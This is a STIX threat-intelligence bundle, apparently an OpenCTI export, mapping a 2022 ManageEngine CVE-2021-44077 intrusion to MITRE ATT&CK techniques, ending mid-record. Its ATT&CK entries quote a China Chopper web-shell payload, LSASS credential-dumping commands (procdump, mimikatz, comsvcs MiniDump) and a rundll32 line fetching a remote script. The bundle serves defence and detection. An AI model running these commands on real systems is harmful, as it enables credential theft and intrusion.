{"type": "bundle", "id": "bundle--b18aa48d-09f9-4726-8789-4633db66d3ba", "objects": [{"id": "identity--b0963901-cb74-56b2-9add-92c6d1a10332", "spec_version": "2.1", "identity_class": "organization", "name": "WithSecure", "description": "WithSecure Oyj, formerly F-Secure Business", "created": "2022-04-19T12:00:00.000Z", "modified": "2022-04-19T06:56:51.802Z", "x_opencti_id": "4bc0444b-1ce0-462b-a12c-52302924e8f8", "type": "identity"}, {"id": "incident--595c781a-ed60-5fe6-96e1-bd4f5159f96a", "spec_version": "2.1", "revoked": false, "confidence": 15, "created": "2022-06-07T04:46:29.731Z", "modified": "2022-06-07T05:07:38.918Z", "name": "DFIR manage engine - June 2022", "description": "Incident from:\nhttps://thedfirreport.com/2022/06/06/will-the-real-msiexec-please-stand-up-exploit-leads-to-data-exfiltration/\n\nInitial-access via ZOHO MANAGEENGINE ADSELFSERVICE PLUS\n", "first_seen": "2022-06-07T04:46:29.698Z", "last_seen": "2022-06-07T04:46:29.698Z", "external_references": [{"source_name": "thedfirreport", "description": "created by import-textlinks", "url": "https://thedfirreport.com/2022/06/06/will-the-real-msiexec-please-stand-up-exploit-leads-to-data-exfiltration/"}], "x_opencti_id": "ae48cc34-d27b-47be-aaa2-ba572cc0dd12", "type": "incident", "created_by_ref": "identity--b0963901-cb74-56b2-9add-92c6d1a10332", "object_marking_refs": ["marking-definition--34098fce-860f-48ae-8e50-ebd3cc5e41da"]}, {"id": "relationship--1f4147de-f820-43f0-b1b3-e5ab07b98b7a", "spec_version": "2.1", "relationship_type": "uses", "description": "Credential dumping with comsvcs", "start_time": "1970-01-01T00:00:00.000Z", "stop_time": "5138-11-16T09:46:40.000Z", "revoked": false, "confidence": 15, "lang": "en", "created": "2022-06-07T04:56:06.647Z", "modified": "2022-06-07T04:56:45.724Z", "x_opencti_id": "8a90d35e-0d7c-4b1b-8fbc-df102c4163ed", "type": "relationship", "source_ref": "incident--595c781a-ed60-5fe6-96e1-bd4f5159f96a", "target_ref": "attack-pattern--79d4065e-ba3c-53e9-9193-63c00c901060"}, {"id": "relationship--2a48c859-71c0-4637-bd5f-84d093b28e0d", "spec_version": "2.1", "relationship_type": "uses", "start_time": "1970-01-01T00:00:00.000Z", "stop_time": "5138-11-16T09:46:40.000Z", "revoked": false, "confidence": 15, "lang": "en", "created": "2022-06-07T04:54:47.220Z", "modified": "2022-06-07T04:54:47.220Z", "x_opencti_id": "f0461d01-0e5c-4f03-8f68-bb5f9f0f6591", "type": "relationship", "source_ref": "incident--595c781a-ed60-5fe6-96e1-bd4f5159f96a", "target_ref": "tool--e42c52b6-4485-5049-a75b-6d3a8fbfd6e7"}, {"id": "relationship--2acd76e1-6b87-4b06-8012-9441ceabcc4f", "spec_version": "2.1", "relationship_type": "uses", "start_time": "1970-01-01T00:00:00.000Z", "stop_time": "5138-11-16T09:46:40.000Z", "revoked": false, "confidence": 15, "lang": "en", "created": "2022-06-07T04:50:11.664Z", "modified": "2022-06-07T04:50:11.664Z", "x_opencti_id": "46c9bb51-8d62-4dd0-8534-45b677e0248c", "type": "relationship", "source_ref": "incident--595c781a-ed60-5fe6-96e1-bd4f5159f96a", "target_ref": "attack-pattern--8558cd4e-b140-5d6a-af5e-762d6873e4fe"}, {"id": "relationship--2c9ed4b1-6e39-4ac8-a7c1-87044ff3064f", "spec_version": "2.1", "relationship_type": "uses", "start_time": "1970-01-01T00:00:00.000Z", "stop_time": "5138-11-16T09:46:40.000Z", "revoked": false, "confidence": 15, "lang": "en", "created": "2022-06-07T04:52:26.868Z", "modified": "2022-06-07T04:52:26.868Z", "x_opencti_id": "b4e71964-a032-4db1-b28c-42d5d0780835", "type": "relationship", "source_ref": "incident--595c781a-ed60-5fe6-96e1-bd4f5159f96a", "target_ref": "tool--7084b19d-06aa-5f68-8488-22eb7db5a127"}, {"id": "relationship--45be11fb-33a9-4474-9bfb-8836a66298e7", "spec_version": "2.1", "relationship_type": "targets", "description": "Exploit likely: https://github.com/horizon3ai/CVE-2021-44077", "start_time": "1970-01-01T00:00:00.000Z", "stop_time": "5138-11-16T09:46:40.000Z", "revoked": false, "confidence": 50, "lang": "en", "created": "2022-06-07T04:48:08.640Z", "modified": "2022-06-07T04:49:10.985Z", "x_opencti_id": "ab201021-0b5d-4230-8164-8aa8a23849c3", "type": "relationship", "source_ref": "incident--595c781a-ed60-5fe6-96e1-bd4f5159f96a", "target_ref": "vulnerability--a9f4d1d8-10a5-5352-815d-acf870f40ad1"}, {"id": "relationship--47578484-7e7c-4444-ba04-5da885c44ba7", "spec_version": "2.1", "relationship_type": "uses", "start_time": "1970-01-01T00:00:00.000Z", "stop_time": "5138-11-16T09:46:40.000Z", "revoked": false, "confidence": 15, "lang": "en", "created": "2022-06-07T04:52:59.020Z", "modified": "2022-06-07T04:52:59.020Z", "x_opencti_id": "d063f1cf-365f-410f-a05c-020b7797850e", "type": "relationship", "source_ref": "incident--595c781a-ed60-5fe6-96e1-bd4f5159f96a", "target_ref": "attack-pattern--45e09dc2-7e3a-5858-bb61-e528c73d6630"}, {"id": "relationship--525de449-945c-4ce4-8e93-ad5520f52928", "spec_version": "2.1", "relationship_type": "uses", "start_time": "1970-01-01T00:00:00.000Z", "stop_time": "5138-11-16T09:46:40.000Z", "revoked": false, "confidence": 50, "lang": "en", "created": "2022-06-07T04:49:54.735Z", "modified": "2022-06-07T04:49:54.735Z", "x_opencti_id": "fb580065-4256-4eed-abc9-b74e0c6b9467", "type": "relationship", "source_ref": "incident--595c781a-ed60-5fe6-96e1-bd4f5159f96a", "target_ref": "attack-pattern--b99b2e84-d430-5d56-94f2-ccaceddce4ad"}, {"id": "relationship--5f705dce-1846-4ea8-b343-37dd386aa463", "spec_version": "2.1", "relationship_type": "uses", "start_time": "1970-01-01T00:00:00.000Z", "stop_time": "5138-11-16T09:46:40.000Z", "revoked": false, "confidence": 15, "lang": "en", "created": "2022-06-07T04:54:13.764Z", "modified": "2022-06-07T04:54:13.764Z", "x_opencti_id": "54348703-e1f0-4ea8-a184-2e01a2c51672", "type": "relationship", "source_ref": "incident--595c781a-ed60-5fe6-96e1-bd4f5159f96a", "target_ref": "tool--2e4ba43b-bc1e-5988-aaa4-9c731352ccf1"}, {"id": "relationship--6f13bdd3-e16c-41db-9251-2965c31c39a8", "spec_version": "2.1", "relationship_type": "uses", "start_time": "1970-01-01T00:00:00.000Z", "stop_time": "5138-11-16T09:46:40.000Z", "revoked": false, "confidence": 15, "lang": "en", "created": "2022-06-07T04:50:52.925Z", "modified": "2022-06-07T04:50:52.925Z", "x_opencti_id": "3dfbcb66-cb1b-4ca4-929f-52c3bb10e7e6", "type": "relationship", "source_ref": "incident--595c781a-ed60-5fe6-96e1-bd4f5159f96a", "target_ref": "attack-pattern--42052935-d06a-5afe-acb1-50004e705b56"}, {"id": "relationship--9890a426-675c-43e5-8cf9-9827dbce991c", "spec_version": "2.1", "relationship_type": "related-to", "description": "Hosting a payload for PowerShell Download cradle.", "start_time": "1970-01-01T00:00:00.000Z", "stop_time": "5138-11-16T09:46:40.000Z", "revoked": false, "confidence": 15, "lang": "en", "created": "2022-06-07T04:59:33.079Z", "modified": "2022-06-07T04:59:52.320Z", "x_opencti_id": "028cca74-a00e-45e2-a699-fe75c9361223", "type": "relationship", "source_ref": "ipv4-addr--933cacb5-c023-527b-a89f-28a1a55b4ea4", "target_ref": "incident--595c781a-ed60-5fe6-96e1-bd4f5159f96a"}, {"id": "relationship--9ab975b7-1bf5-4d99-a7f4-026be1bb4e3a", "spec_version": "2.1", "relationship_type": "uses", "start_time": "1970-01-01T00:00:00.000Z", "stop_time": "5138-11-16T09:46:40.000Z", "revoked": false, "confidence": 15, "lang": "en", "created": "2022-06-07T04:53:58.928Z", "modified": "2022-06-07T04:53:58.928Z", "x_opencti_id": "a6893cc7-669f-4b55-92a2-8977efea8d0c", "type": "relationship", "source_ref": "incident--595c781a-ed60-5fe6-96e1-bd4f5159f96a", "target_ref": "attack-pattern--95b0200a-aaf6-5557-b19b-6034e2b82c97"}, {"id": "relationship--a057ba42-686c-482b-aa62-086871330d53", "spec_version": "2.1", "relationship_type": "uses", "start_time": "1970-01-01T00:00:00.000Z", "stop_time": "5138-11-16T09:46:40.000Z", "revoked": false, "confidence": 15, "lang": "en", "created": "2022-06-07T04:54:33.633Z", "modified": "2022-06-07T04:54:33.633Z", "x_opencti_id": "83e6d130-c5e1-4975-9681-34d7f374399f", "type": "relationship", "source_ref": "incident--595c781a-ed60-5fe6-96e1-bd4f5159f96a", "target_ref": "attack-pattern--fb5adb10-bb73-5267-a0a8-7f5339fcd4fe"}, {"id": "relationship--b421578e-8c92-4fed-8b4a-f697c4f0c368", "spec_version": "2.1", "relationship_type": "uses", "start_time": "1970-01-01T00:00:00.000Z", "stop_time": "5138-11-16T09:46:40.000Z", "revoked": false, "confidence": 15, "lang": "en", "created": "2022-06-07T04:53:20.539Z", "modified": "2022-06-07T04:53:20.539Z", "x_opencti_id": "12f8a370-9d2a-439b-b283-09a4ec8726d7", "type": "relationship", "source_ref": "incident--595c781a-ed60-5fe6-96e1-bd4f5159f96a", "target_ref": "attack-pattern--cbf0c8ca-5d6a-53be-b391-93f861e48d47"}, {"id": "relationship--f4f009b9-a034-4026-95e1-420762a0a957", "spec_version": "2.1", "relationship_type": "uses", "start_time": "1970-01-01T00:00:00.000Z", "stop_time": "5138-11-16T09:46:40.000Z", "revoked": false, "confidence": 15, "lang": "en", "created": "2022-06-07T05:00:41.931Z", "modified": "2022-06-07T05:00:41.931Z", "x_opencti_id": "3af768a3-a7fe-47b6-9bd0-34a6170927ce", "type": "relationship", "source_ref": "incident--595c781a-ed60-5fe6-96e1-bd4f5159f96a", "target_ref": "tool--a58996a6-65cb-5d59-ba5a-8ae3f197f8dc"}, {"id": "relationship--f5da7b35-7534-44b4-80f8-270bd291faac", "spec_version": "2.1", "relationship_type": "uses", "start_time": "1970-01-01T00:00:00.000Z", "stop_time": "5138-11-16T09:46:40.000Z", "revoked": false, "confidence": 15, "lang": "en", "created": "2022-06-07T04:57:12.148Z", "modified": "2022-06-07T04:57:12.148Z", "x_opencti_id": "226115c4-baf5-4111-a417-802ec3863196", "type": "relationship", "source_ref": "incident--595c781a-ed60-5fe6-96e1-bd4f5159f96a", "target_ref": "attack-pattern--0e3468b8-dc0e-508c-8214-b1da569c42f8"}, {"id": "relationship--f9d87e0e-cdbf-41b6-8663-9da06af80daa", "spec_version": "2.1", "relationship_type": "uses", "start_time": "1970-01-01T00:00:00.000Z", "stop_time": "5138-11-16T09:46:40.000Z", "revoked": false, "confidence": 15, "lang": "en", "created": "2022-06-07T05:01:47.912Z", "modified": "2022-06-07T05:01:47.912Z", "x_opencti_id": "21c6e5a8-3c38-4af7-94fb-9f6ed3128fea", "type": "relationship", "source_ref": "incident--595c781a-ed60-5fe6-96e1-bd4f5159f96a", "target_ref": "attack-pattern--a9f45d33-1027-5ed5-8297-8f7969861016"}, {"id": "relationship--fe4f5f0f-87b7-484d-9ac2-898c592c5eb0", "spec_version": "2.1", "relationship_type": "uses", "start_time": "1970-01-01T00:00:00.000Z", "stop_time": "5138-11-16T09:46:40.000Z", "revoked": false, "confidence": 15, "lang": "en", "created": "2022-06-07T05:00:29.920Z", "modified": "2022-06-07T05:00:29.920Z", "x_opencti_id": "b5dcd5aa-d269-410d-a13e-da6f3b585edf", "type": "relationship", "source_ref": "incident--595c781a-ed60-5fe6-96e1-bd4f5159f96a", "target_ref": "tool--14c7dce1-ff3b-5ed2-ab82-784e09c62bb1"}, {"type": "marking-definition", "spec_version": "2.1", "id": "marking-definition--47645da4-afb2-5733-bafb-f7cd98ec4e7d", "created": "2017-06-01T00:00:00.000Z", "definition_type": "statement", "name": "Copyright 2015-2021, The MITRE Corporation. MITRE ATT&CK and ATT&CK are registered trademarks of The MITRE Corporation.", "definition": {"statement": "copyright 2015-2021, the mitre corporation. mitre att&ck and att&ck are registered trademarks of the mitre corporation."}}, {"id": "attack-pattern--79d4065e-ba3c-53e9-9193-63c00c901060", "spec_version": "2.1", "revoked": true, "confidence": 15, "created": "2017-05-31T21:31:06.045Z", "modified": "2022-04-27T04:59:15.142Z", "name": "Rundll32", "description": "The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.\n\nRundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions `Control_RunDLL` and `Control_RunDLLAsUser`. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: `rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"`  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)", "x_mitre_platforms": ["Windows"], "x_mitre_permissions_required": ["User"], "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.", "x_mitre_id": "T1085", "kill_chain_phases": [{"kill_chain_name": "mitre-attack", "phase_name": "defense-evasion", "x_opencti_order": 0}, {"kill_chain_name": "mitre-attack", "phase_name": "execution", "x_opencti_order": 0}], "external_references": [{"source_name": "TrendMicro CPL Malware Jan 2014", "description": "Merc\u00eas, F. (2014, January 27). CPL Malware - Malicious Control Panel Items. Retrieved January 18, 2018.", "url": "https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf"}, {"source_name": "This is Security Command Line Confusion", "description": "B. Ancel. (2014, August 20). Poweliks \u2013 Command Line Confusion. Retrieved March 5, 2018.", "url": "https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/"}, {"source_name": "mitre-attack", "url": "https://attack.mitre.org/techniques/T1085", "external_id": "T1085"}], "x_opencti_id": "0e94249e-bcb3-4890-8cf4-6e07793f3b73", "type": "attack-pattern", "object_marking_refs": ["marking-definition--47645da4-afb2-5733-bafb-f7cd98ec4e7d"]}, {"id": "identity--f11b0831-e7e6-5214-9431-ccf054e53e94", "spec_version": "2.1", "identity_class": "organization", "name": "The MITRE Corporation", "created": "2022-01-21T04:44:01.072Z", "modified": "2022-08-15T14:09:42.312Z", "x_opencti_id": "0285a137-cea3-4841-8bab-c30a43de2def", "type": "identity"}, {"id": "tool--e42c52b6-4485-5049-a75b-6d3a8fbfd6e7", "spec_version": "2.1", "revoked": false, "confidence": 15, "created": "2017-05-31T21:32:39.233Z", "modified": "2022-08-15T14:13:42.674Z", "name": "Tasklist", "description": "The [Tasklist](https://attack.mitre.org/software/S0057) utility displays a list of applications and services with their Process IDs (PID) for all tasks running on either a local or a remote computer. It is packaged with Windows operating systems and can be executed from the command-line interface. (Citation: Microsoft Tasklist)", "aliases": ["Tasklist"], "labels": ["tool"], "external_references": [{"source_name": "mitre-attack", "url": "https://attack.mitre.org/software/S0057", "external_id": "S0057"}, {"source_name": "Microsoft Tasklist", "description": "Microsoft. (n.d.). Tasklist. Retrieved December 23, 2015.", "url": "https://technet.microsoft.com/en-us/library/bb491010.aspx"}], "x_opencti_id": "3be61d5f-e5bb-48e1-94c7-c07c88568c8d", "type": "tool", "created_by_ref": "identity--f11b0831-e7e6-5214-9431-ccf054e53e94", "object_marking_refs": ["marking-definition--47645da4-afb2-5733-bafb-f7cd98ec4e7d"]}, {"type": "marking-definition", "spec_version": "2.1", "id": "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9", "created": "2017-01-20T00:00:00.000Z", "definition_type": "tlp", "name": "TLP:WHITE", "definition": {"tlp": "white"}}, {"id": "attack-pattern--8558cd4e-b140-5d6a-af5e-762d6873e4fe", "spec_version": "2.1", "revoked": true, "confidence": 15, "created": "2017-05-31T21:31:13.061Z", "modified": "2022-08-15T14:14:26.387Z", "name": "Web Shell", "description": "A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)\n\nWeb shells may serve as [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a persistence mechanism in case an adversary's primary access methods are detected and removed.", "aliases": ["Web Shell"], "x_mitre_platforms": ["Linux", "Windows", "macOS"], "x_mitre_detection": "Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013)\n\n<code><?php @eval($_POST['password']);></code>\n\nNevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running [cmd](https://attack.mitre.org/software/S0106) or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells)", "x_mitre_id": "T1100", "kill_chain_phases": [{"kill_chain_name": "mitre-attack", "phase_name": "persistence", "x_opencti_order": 0}, {"kill_chain_name": "mitre-attack", "phase_name": "privilege-escalation", "x_opencti_order": 0}], "external_references": [{"source_name": "Lee 2013", "description": "Lee, T., Hanzlik, D., Ahl, I. (2013, August 7). Breaking Down the China Chopper Web Shell - Part I. Retrieved March 27, 2015.", "url": "https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html"}, {"source_name": "US-CERT Alert TA15-314A Web Shells", "description": "US-CERT. (2015, November 13). Compromised Web Servers and Web Shells - Threat Awareness and Guidance. Retrieved June 8, 2016.", "url": "https://www.us-cert.gov/ncas/alerts/TA15-314A"}, {"source_name": "capec", "url": "https://capec.mitre.org/data/definitions/650.html", "external_id": "CAPEC-650"}, {"source_name": "mitre-attack", "url": "https://attack.mitre.org/techniques/T1100", "external_id": "T1100"}], "x_opencti_id": "42dc08d9-bec6-460e-98ce-b91ab11cadcd", "type": "attack-pattern", "object_marking_refs": ["marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9", "marking-definition--47645da4-afb2-5733-bafb-f7cd98ec4e7d"]}, {"id": "tool--7084b19d-06aa-5f68-8488-22eb7db5a127", "spec_version": "2.1", "revoked": false, "confidence": 15, "created": "2017-05-31T21:33:02.863Z", "modified": "2022-08-15T14:13:42.704Z", "name": "ipconfig", "description": "[ipconfig](https://attack.mitre.org/software/S0100) is a Windows utility that can be used to find information about a system's TCP/IP, DNS, DHCP, and adapter configuration. (Citation: TechNet Ipconfig)", "aliases": ["ipconfig", "ipconfig.exe"], "labels": ["tool"], "external_references": [{"source_name": "mitre-attack", "url": "https://attack.mitre.org/software/S0100", "external_id": "S0100"}, {"source_name": "TechNet Ipconfig", "description": "Microsoft. (n.d.). Ipconfig. Retrieved April 17, 2016.", "url": "https://technet.microsoft.com/en-us/library/bb490921.aspx"}], "x_opencti_id": "8e330f2a-e471-4630-be97-ae8f97659a7e", "type": "tool", "created_by_ref": "identity--f11b0831-e7e6-5214-9431-ccf054e53e94", "object_marking_refs": ["marking-definition--47645da4-afb2-5733-bafb-f7cd98ec4e7d"]}, {"id": "vulnerability--a9f4d1d8-10a5-5352-815d-acf870f40ad1", "spec_version": "2.1", "revoked": false, "confidence": 15, "created": "2021-11-29T04:15:00.000Z", "modified": "2022-07-06T08:02:09.351Z", "name": "CVE-2021-44077", "description": "Zoho ManageEngine ServiceDesk Plus before 11306, ServiceDesk Plus MSP before 10530, and SupportCenter Plus before 11014 are vulnerable to unauthenticated remote code execution. This is related to /RestAPI URLs in a servlet, and ImportTechnicians in the Struts configuration.", "x_opencti_base_score": 9.8, "x_opencti_base_severity": "CRITICAL", "x_opencti_attack_vector": "NETWORK", "x_opencti_integrity_impact": "HIGH", "x_opencti_availability_impact": "HIGH", "x_opencti_confidentiality_impact": "HIGH", "labels": ["exploited_itw"], "external_references": [{"source_name": "MISC", "url": "https://pitstop.manageengine.com/portal/en/community/topic/security-advisory-authentication-bypass-vulnerability-in-servicedesk-plus-versions-11138-and-above"}, {"source_name": "NIST NVD", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-44077"}, {"source_name": "cisa.gov", "description": "CISA Catalog of Known Exploited Vulnerabilities", "url": "www.cisa.gov/known-exploited-vulnerabilities-catalog"}, {"source_name": "MISC", "url": "https://pitstop.manageengine.com/portal/en/community/topic/security-advisory-for-cve-2021-44077-unauthenticated-rce-vulnerability-in-servicedesk-plus-msp-versions-10527-till-10529"}, {"source_name": "MISC", "url": "http://packetstormsecurity.com/files/165400/ManageEngine-ServiceDesk-Plus-Remote-Code-Execution.html"}, {"source_name": "MISC", "url": "https://pitstop.manageengine.com/portal/en/community/topic/security-advisory-for-cve-2021-44077-unauthenticated-rce-vulnerability-in-supportcenter-plus-versions-11012-and-11013"}, {"source_name": "MISC", "url": "https://pitstop.manageengine.com/portal/en/community/topic/security-advisory-for-cve-2021-44077-unauthenticated-rce-vulnerability-in-servicedesk-plus-versions-up-to-11305-22-11-2021"}], "x_opencti_id": "bc9b510a-e1f6-4224-a7fa-e8c32723b936", "type": "vulnerability", "created_by_ref": "identity--f11b0831-e7e6-5214-9431-ccf054e53e94", "object_marking_refs": ["marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"]}, {"id": "attack-pattern--45e09dc2-7e3a-5858-bb61-e528c73d6630", "spec_version": "2.1", "revoked": false, "confidence": 15, "created": "2020-01-24T14:38:49.266Z", "modified": "2022-08-15T14:13:59.988Z", "name": "Msiexec", "description": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the `AlwaysInstallElevated` policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)", "aliases": ["Msiexec"], "x_mitre_platforms": ["Windows"], "x_mitre_permissions_required": ["User"], "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of msiexec.exe. Compare recent invocations of msiexec.exe with prior history of known good arguments and executed MSI files or DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of msiexec.exe may also be useful in determining the origin and purpose of the MSI files or DLLs being executed.", "x_mitre_id": "T1218.007", "kill_chain_phases": [{"kill_chain_name": "mitre-attack", "phase_name": "defense-evasion", "x_opencti_order": 0}], "external_references": [{"source_name": "mitre-attack", "url": "https://attack.mitre.org/techniques/T1218/007", "external_id": "T1218.007"}, {"source_name": "Microsoft AlwaysInstallElevated 2018", "description": "Microsoft. (2018, May 31). AlwaysInstallElevated. Retrieved December 14, 2020.", "url": "https://docs.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated"}, {"source_name": "LOLBAS Msiexec", "description": "LOLBAS. (n.d.). Msiexec.exe. Retrieved April 18, 2019.", "url": "https://lolbas-project.github.io/lolbas/Binaries/Msiexec/"}, {"source_name": "Microsoft msiexec", "description": "Microsoft. (2017, October 15). msiexec. Retrieved January 24, 2020.", "url": "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec"}, {"source_name": "TrendMicro Msiexec Feb 2018", "description": "Co, M. and Sison, G. (2018, February 8). Attack Using Windows Installer msiexec.exe leads to LokiBot. Retrieved April 18, 2019.", "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/"}], "x_opencti_id": "4887b4f7-eb2f-4d77-9a98-155eb4c16250", "type": "attack-pattern", "created_by_ref": "identity--f11b0831-e7e6-5214-9431-ccf054e53e94", "object_marking_refs": ["marking-definition--47645da4-afb2-5733-bafb-f7cd98ec4e7d", "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"]}, {"id": "attack-pattern--b99b2e84-d430-5d56-94f2-ccaceddce4ad", "spec_version": "2.1", "revoked": false, "confidence": 15, "created": "2020-02-11T18:41:44.783Z", "modified": "2022-08-15T14:14:09.092Z", "name": "LSASS Memory", "description": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* `procdump -ma lsass.exe lsass_dump`\n\nLocally, mimikatz can be run using:\n\n* `sekurlsa::Minidump lsassdump.dmp`\n* `sekurlsa::logonPasswords`\n\nBuilt-in Windows tools such as comsvcs.dll can also be used:\n\n* `rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full`(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)\n\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages` and `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages`. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)\n", "aliases": ["LSASS Memory"], "x_mitre_platforms": ["Windows"], "x_mitre_permissions_required": ["Administrator", "SYSTEM"], "x_mitre_detection": "Monitor for unexpected processes interacting with LSASS.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.\n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.", "x_mitre_id": "T1003.001", "kill_chain_phases": [{"kill_chain_name": "mitre-attack", "phase_name": "credential-access", "x_opencti_order": 0}], "external_references": [{"source_name": "Graeber 2014", "description": "Graeber, M. (2014, October). Analysis of Malicious Security Support Provider DLLs. Retrieved March 1, 2017.", "url": "http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html"}, {"source_name": "Medium Detecting Attempts to Steal Passwords from Memory", "description": "French, D. (2018, October 2). Detecting Attempts to Steal Passwords from Memory. Retrieved October 11, 2019.", "url": "https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea"}, {"source_name": "TechNet Blogs Credential Protection", "description": "Wilson, B. (2016, April 18). The Importance of KB2871997 and KB2928120 for Credential Protection. Retrieved April 11, 2018.", "url": "https://blogs.technet.microsoft.com/askpfeplat/2016/04/18/the-importance-of-kb2871997-and-kb2928120-for-credential-protection/"}, {"source_name": "Volexity Exchange Marauder March 2021", "description": "Gruzweig, J. et al. (2021, March 2). Operation Exchange Marauder: Active Exploitation of Multiple Zero-Day Microsoft Exchange Vulnerabilities. Retrieved March 3, 2021.", "url": "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/"}, {"source_name": "Powersploit", "description": "PowerSploit. (n.d.). Retrieved December 4, 2014.", "url": "https://github.com/mattifestation/PowerSploit"}, {"source_name": "Symantec Attacks Against Government Sector", "description": "Symantec. (2021, June 10). Attacks Against the Government Sector. Retrieved September 28, 2021.", "url": "https://symantec.broadcom.com/hubfs/Attacks-Against-Government-Sector.pdf"}, {"source_name": "mitre-attack", "url": "https://attack.mitre.org/techniques/T1003/001", "external_id": "T1003.001"}], "x_opencti_id": "7934282c-a09c-465a-b8fa-61af26472217", "type": "attack-pattern", "created_by_ref": "identity--f11b0831-e7e6-5214-9431-ccf054e53e94", "object_marking_refs": ["marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9", "marking-definition--47645da4-afb2-5733-bafb-f7cd98ec4e7d"]}, {"id": "tool--2e4ba43b-bc1e-5988-aaa4-9c731352ccf1", "spec_version": "2.1", "revoked": false, "confidence": 15, "created": "2017-05-31T21:33:00.969Z", "modified": "2022-08-15T14:13:44.905Z", "name": "Systeminfo", "description": 